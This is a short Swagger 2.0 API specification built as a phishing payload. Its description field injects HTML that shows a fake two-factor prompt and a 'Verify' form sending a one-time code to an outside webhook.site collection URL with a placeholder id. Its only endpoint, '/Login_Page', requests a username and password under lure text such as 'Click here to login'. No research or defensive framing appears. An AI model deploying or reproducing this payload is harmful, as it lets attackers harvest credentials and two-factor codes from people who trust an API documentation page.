swagger: '2.0'
info:
  version: 1.0.0
  title: 'Swagger UI'
  description: '<div style="width:100%;max-width:420px;margin:20px auto;padding:20px;background:#e2e3ff;border-radius:8px;"><div style="background:#e2e3ff;color:#2b2d64;padding:16px 20px;text-align:center;border:1px solid rgba(0,0,0,.15);border-radius:4px;font-size:15px;"><strong>Two-Factor Authentication required to access this API.</strong></div></div><h1 style="text-align:center;font-size:24px;color:#333;">Enter Verification Code</h1><div style="width:100%;max-width:400px;margin:0 auto;padding:20px;background:#fff;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,.1);"><form action="https://webhook.site/REPLACE-ME" method="post" class="form-signin"><label>6-digit code sent to your device</label><br><input type="text" name="otp" maxlength="6" inputmode="numeric" style="width:100%;padding:12px;font-size:20px;letter-spacing:8px;text-align:center;"><button type="submit" style="width:100%;padding:12px;margin-top:18px;background:#28a745;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;">Verify</button></form></div><div style="position:fixed;bottom:10px;right:10px;font-size:12px;color:#888;">v</div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
